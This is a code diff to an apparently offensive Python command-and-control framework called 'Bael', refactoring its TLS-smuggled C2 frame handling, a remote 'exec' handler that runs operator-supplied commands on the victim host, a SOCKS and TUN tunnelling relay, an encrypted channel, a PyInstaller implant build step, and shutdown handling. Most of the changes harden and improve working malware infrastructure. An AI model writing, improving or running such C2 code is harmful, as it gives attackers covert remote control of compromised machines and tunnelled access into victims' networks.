@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-import asyncio, ssl, argparse, random, os, logging, sys, socket, struct, threading, urllib.request, fcntl, time, tty
-import subprocess, shutil, base64, hashlib, socket, json, ctypes, string, signal, zlib, termios, array, platform, select
+import asyncio, ssl, argparse, random, os, logging, sys, socket, struct, threading, urllib.request, fcntl, time, tty, shlex, hmac
+import subprocess, shutil, base64, hashlib, json, ctypes, string, signal, zlib, termios, array, platform, select
 from pathlib import Path
 from collections import deque
 from typing import Tuple, Optional, Deque, Any, Dict, List, Union
@@ -75,6 +75,16 @@ handler = logging.StreamHandler()
 handler.setFormatter(BaelFormatter(datefmt="%H:%M:%S"))
 logger.addHandler(handler)
 
+def bHexdump(data: bytes, length: int = 16, prefix: str = "") -> str:
+    if not data: return "(empty)" if prefix else ""
+    lines = []
+    for i in range(0, len(data), length):
+        chunk = data[i:i + length]
+        hStr = ' '.join(f'{b:02x}' for b in chunk)
+        aStr = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in chunk)
+        lines.append(f"{prefix}{i:04x}  {hStr:<{length*3}}  {aStr}")
+    return '\n'.join(lines)
+
 SMUGGLE_MAGIC = b"\xBA\x31\xDE\xAD\xC0\xDE"
 EMBEDDED_CERTS: Dict[str, str] = {}
 
@@ -113,16 +123,6 @@ class SocksRelay:
         self.magic = SMUGGLE_MAGIC
         self.username = username
         self.password = password
-
-    def _hexdump(self,data:bytes,length:int=16,prefix:str="") -> str:
-        if not data: return "(empty)"
-        lines = []
-        for i in range(0, len(data), length):
-            chunk = data[i:i + length]
-            hStr = ' '.join(f'{b:02x}' for b in chunk)
-            aStr = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in chunk)
-            lines.append(f"{prefix}{i:04x}  {hStr:<{length*3}}  {aStr}")
-        return '\n'.join(lines)
 
     async def handle(self,socks_r, socks_w, tls_r, tls_w, engine=None):
         logger.info("<-> [SOCKS] New client handle started")
@@ -182,9 +182,9 @@ class SocksRelay:
             logger.info("[-] [SOCKS] Handshake completed successfully")
             # === Launch both directions with heavy logging ===
             logger.info("[RELAY] Starting bidirectional tasks...")
-            socks_to_tls = self._socks_to_tls(socks_r, tls_w, engine)
-            tls_to_socks = self._tls_to_socks(tls_r, socks_w, engine)
-            await asyncio.gather(socks_to_tls, tls_to_socks, return_exceptions=True)
+            async with asyncio.TaskGroup() as tg:
+                tg.create_task(self._socks_to_tls(socks_r, tls_w, engine))
+                tg.create_task(self._tls_to_socks(tls_r, socks_w, engine))
 
         except asyncio.TimeoutError as e: logger.error(f"[SOCKS] Timeout during handshake: {e}")
         except Exception as e:
@@ -235,7 +235,7 @@ class SocksRelay:
                 logger.info(f"↘ [TASK] RECEIVED {len(data)} bytes from TLS!")
                 buffer.extend(data)
                 if len(data) > 16:
-                    logger.debug(f"↘ First 64 bytes:\n{self._hexdump(data[:64])}")
+                    logger.debug(f"↘ First 64 bytes:\n{bHexdump(data[:64], prefix='  ')}")
                 # === C2 Frame Extraction ===
                 while self.magic in buffer:
                     magic_idx = buffer.find(self.magic)
@@ -616,21 +616,10 @@ class C2:
 
     # Core
 
-    def _hexdump(self, data: bytes, length: int = 16) -> str:
-        """Displays data in hex and ASCII format"""
-        if not data: return ""
-        lines = []
-        for i in range(0, len(data), length):
-            chunk = data[i:i + length]
-            hex_val = ' '.join(f'{b:02x}' for b in chunk)
-            ascii_val = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in chunk)
-            lines.append(f"{i:04x}  {hex_val:<47}  {ascii_val}")
-        return "\n" + "\n".join(lines)
-
     async def pCommand(self, data: bytes):
         try:
             if not data or len(data) < len(SMUGGLE_MAGIC) + 10: return False
-            logger.debug(f"[C2] Received frame: {len(data)} bytes{self._hexdump(data)}")
+            logger.debug(f"[C2] Received frame: {len(data)} bytes\n{bHexdump(data)}")
             if SMUGGLE_MAGIC not in data:
                 logger.debug("[C2] Smuggle Magic Not Detected...")
                 return False
@@ -651,7 +640,7 @@ class C2:
             arg = arg.strip()
             handlers = {
                 "ping": lambda: b"PONG",
-                "exec": lambda a: subprocess.getoutput(a).encode(errors='replace'),
+                "exec": self._async_exec,
                 "sysinfo": lambda: self._get_sysinfo(),
                 "whoami": lambda: self._get_whoami(),
                 "hardware": lambda: self._get_hardware_info(),
@@ -682,6 +671,21 @@ class C2:
             import traceback
             logger.error(traceback.format_exc())
         return False
+
+    async def _async_exec(self, arg: str) -> bytes:
+        try:
+            cmd_parts = shlex.split(arg)
+            if not cmd_parts:
+                return b"Error: No command provided"
+            proc = await asyncio.create_subprocess_exec(
+                *cmd_parts,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            stdout, stderr = await proc.communicate()
+            return (stdout or b"") + (stderr or b"")
+        except Exception as e:
+            return f"Exec failed: {e}".encode()
 
     def _get_whoami(self):
         try:
@@ -809,12 +813,6 @@ class C2:
         self.logger.debug("(ioURingEnumProc) ROUT: %s",rout)
         return rout
     
-
-    def retShellcode(self,name:str)->bytes:
-        if self.shellcode == None: self._setupShellcode()
-        if name not in self.shellcode: self.logger.warning("(retShellCode) %s not found in shellcodes.",name)
-        return self.shellcode.get(name,b"").get("bytes",b"")
-
     def _pollFD(self,fd:int,timeout:int)->bool:
         """Simple poll helper"""
         self.logger.debug("(_pollFD) A")
@@ -926,26 +924,53 @@ class Crypto:
 
     def _dKeys(self, hkdf_len: int = 32, hkdf_salt: str = "BaelSalt", hkdf_info="C2"):
         if not CRYPTO_AVAILABLE:
-            self.key = hashlib.sha256(self.mKey).digest()
-            self.logger.debug("Cryptography modules not available, key digested.")
+            # Use PBKDF2 as a fallback for HKDF to derive a strong key
+            salt = hkdf_salt.encode() if isinstance(hkdf_salt, str) else hkdf_salt
+            self.key = hashlib.pbkdf2_hmac('sha256', self.mKey, salt, 10000, dklen=hkdf_len)
+            self.logger.debug("Cryptography modules not available, key derived via PBKDF2.")
             return
         hkdf_salt = hkdf_salt.encode() if isinstance(hkdf_salt, str) else hkdf_salt
         hkdf_info = hkdf_info.encode() if isinstance(hkdf_info, str) else hkdf_info
         hkdf = HKDF(algorithm=hashes.SHA256(), length=hkdf_len, salt=hkdf_salt, info=hkdf_info)
         self.key = hkdf.derive(self.mKey)
 
+    def _get_keystream(self, length: int, nonce: bytes) -> bytes:
+        """Standard lib fallback keystream generator (HMAC-SHA256 based stream cipher)"""
+        keystream = bytearray()
+        counter = 0
+        while len(keystream) < length:
+            # Create a unique block based on key, nonce and counter
+            msg = nonce + counter.to_bytes(4, 'big')
+            block = hmac.new(self.key, msg, hashlib.sha256).digest()
+            keystream.extend(block)
+            counter += 1
+        return bytes(keystream[:length])
+
     def encrypt(self, data: bytes) -> bytes:
         if not CRYPTO_AVAILABLE:
-            k = self.key * (len(data) // len(self.key) + 1)
-            return bytes(a ^ b for a, b in zip(data, k))
+            nonce = os.urandom(12)  # Match standard AEAD nonce size
+            keystream = self._get_keystream(len(data), nonce)
+            ciphertext = bytes(a ^ b for a, b in zip(data, keystream))
+            # Calculate HMAC for integrity (truncated to 16 bytes to match AEAD overhead)
+            tag = hmac.new(self.key, nonce + ciphertext, hashlib.sha256).digest()[:16]
+            return nonce + ciphertext + tag
         nonce = os.urandom(12)
         chacha = ChaCha20Poly1305(self.key)
         return nonce + chacha.encrypt(nonce, data, None)
 
     def decrypt(self, data: bytes) -> bytes:
         if not CRYPTO_AVAILABLE:
-            k = self.key * (len(data) // len(self.key) + 1)
-            return bytes(a ^ b for a, b in zip(data, k))
+            if len(data) < 28: return b""  # 12 (nonce) + 16 (tag)
+            nonce = data[:12]
+            ciphertext = data[12:-16]
+            tag = data[-16:]
+            # Verify integrity
+            expected_tag = hmac.new(self.key, nonce + ciphertext, hashlib.sha256).digest()[:16]
+            if not hmac.compare_digest(tag, expected_tag):
+                self.logger.error("C2 Decryption failed: MAC verification failed.")
+                return b""
+            keystream = self._get_keystream(len(ciphertext), nonce)
+            return bytes(a ^ b for a, b in zip(ciphertext, keystream))
         nonce = data[:12]
         chacha = ChaCha20Poly1305(self.key)
         try:
@@ -968,6 +993,7 @@ class Bael:
         self.crypt = Crypto(self.shieldKey)
         self.c2 = C2(self.crypt, self, args)
         self.SSLCTX = self._setupPKI()
+        self._shutdown_event = asyncio.Event() # Initialize shutdown event
         self._loadSmuggleData()
         self.console = HiveMindConsole(self)
         logger.debug(f"PKI Status - Server: {self.server} | Key: {self.shieldKey[:8]}...")
@@ -989,6 +1015,7 @@ class Bael:
             PyInstaller.__main__.run(cArgs)
             logger.info(f"Build complete. Binary: {dPath}/{name}")
         except Exception as e: logger.error(f"Build failed: {e}")
+
 
     def _loadSmuggleData(self):
         if path := self.config.get("tData"):
@@ -1065,11 +1092,21 @@ class Bael:
     async def spawnServer(self, lhost: str = "0.0.0.0", lport: int = 443):
         svr = await asyncio.start_server(self._clientHandle, lhost, lport, ssl=self.SSLCTX)
         logger.info(f"(C2) Listening on {lhost}:{lport}")
-        
         # Start the interactive console as a background task
-        asyncio.create_task(self.console.run())
-        
-        async with svr: await svr.serve_forever() 
+        consoleTask = asyncio.create_task(self.console.run())
+        try:
+            await svr.serve_forever() # This will run until cancelled by the parent task
+        except asyncio.CancelledError:
+            logger.debug("Server `serve_forever` task cancelled.")
+        finally:
+            try: svr.close()
+            except: pass
+            await svr.wait_closed()
+            consoleTask.cancel() # Cancel console as well
+            # Don't hang forever if input() is blocking a thread in the executor
+            try: await asyncio.wait_for(consoleTask, timeout=1.5)
+            except: pass
+            logger.info("Server gracefully shut down.")
 
     async def _clientHandle(self, r, w):
         peer = w.get_extra_info('peername')
@@ -1083,7 +1120,9 @@ class Bael:
             w.write(resp)
             await w.drain()
             logger.info(f"[-] Sent auto enumeration to {peer}")
-            await asyncio.gather(self._serverToClient(w), self._clientToServer(r))
+            async with asyncio.TaskGroup() as tg:
+                tg.create_task(self._serverToClient(w))
+                tg.create_task(self._clientToServer(r))
         finally:w.close()
 
     async def _serverToClient(self, w):
@@ -1175,30 +1214,63 @@ class Bael:
                     '127.0.0.1', 1080
                 )
                 logger.info("^ SOCKS5 relay listening on 127.0.0.1:1080")
-                async with srv:
-                    await srv.serve_forever()
+                try:
+                    await srv.serve_forever() # This will run until cancelled by the parent task
+                except asyncio.CancelledError:
+                    logger.debug("SOCKS5 server `serve_forever` task cancelled.")
+                finally:
+                    try: srv.close()
+                    except: pass
+                    await srv.wait_closed()
+                    logger.info("SOCKS5 server gracefully shut down.")
+
             else:
                 if os.getuid() != 0:
                     raise PermissionError("TUN requires root. Use --socks.")
                 self.setupTun()
-                await asyncio.gather(self._bridgeTUN(r, w, True), self._bridgeTUN(r, w, False))
+                async with asyncio.TaskGroup() as tg:
+                    tg.create_task(self._bridgeTUN(r, w, True))
+                    tg.create_task(self._bridgeTUN(r, w, False))
                 
         except Exception as e:
             logger.error(f"Connection failed: {type(e).__name__}: {e}")
             raise
 
     async def spawn(self):
+        self.mTask = None
         try:
+            # Create the main operational task (server or client)
             if self.server: 
-                await self.spawnServer(self.config["lhost"][0], self.config["lhost"][1])
+                self.mTask = asyncio.create_task(self.spawnServer(self.config["lhost"][0], self.config["lhost"][1]))
             else: 
-                await self.spawnClient(self.config["rhost"][0], self.config["rhost"][1])
+                self.mTask = asyncio.create_task(self.spawnClient(self.config["rhost"][0], self.config["rhost"][1]))
+
+            shutdown_wait_task = asyncio.create_task(self._shutdown_event.wait())
+            # Wait for either the main task to complete or a shutdown signal
+            done, pending = await asyncio.wait(
+                [self.mTask, shutdown_wait_task],
+                return_when=asyncio.FIRST_COMPLETED
+            )
+
+            if self._shutdown_event.is_set():
+                logger.info("Shutdown event received. Cancelling main task...")
+                if self.mTask:
+                    self.mTask.cancel()
+                    try: await asyncio.wait_for(self.mTask, timeout=5.0)
+                    except: logger.debug("Main task cleanup concluded (timed out or cancelled).")
+            else: # If mTask completed naturally
+                logger.info("Main operational task completed naturally.")
+                shutdown_wait_task.cancel()
+                try: await shutdown_wait_task
+                except asyncio.CancelledError: pass
         except Exception as e:
             import traceback
             logger.error(f"Engine failure: {e}")
             logger.error(traceback.format_exc())
         finally: 
+            logger.info("Performing final cleanup...")
             self.cleanup()
+            logger.info("Cleanup complete.")
 
 # ====================== BUILD / KEYGEN ======================
 def embass(key:str,args):
@@ -1334,6 +1406,29 @@ def main():
         "socks_user": args.socks_user,
         "socks_pass": args.socks_pass}
     logger.debug(f"(MAIN:conf) {str(json.dumps(conf,indent=2))}")
-    asyncio.run(Bael(conf, args).spawn())
+    engine = Bael(conf, args)
+
+    shutdown_triggered = False
+    def gSH(signum, frame):
+        nonlocal shutdown_triggered
+        if shutdown_triggered:
+            logger.critical("Double interrupt detected. Forcing immediate exit.")
+            os._exit(1)
+        shutdown_triggered = True
+        logger.info(f"Received signal {signum}, initiating graceful shutdown...")
+        try:
+            loop = asyncio.get_event_loop()
+            if loop.is_running():
+                loop.call_soon_threadsafe(engine._shutdown_event.set)
+        except: pass
+
+    signal.signal(signal.SIGINT, gSH)
+    signal.signal(signal.SIGTERM, gSH)
+
+    try:
+        asyncio.run(engine.spawn())
+    finally:
+        if shutdown_triggered:
+            os._exit(0) # Final hammer to kill any hanging executor threads
 
 if __name__ == "__main__": main()
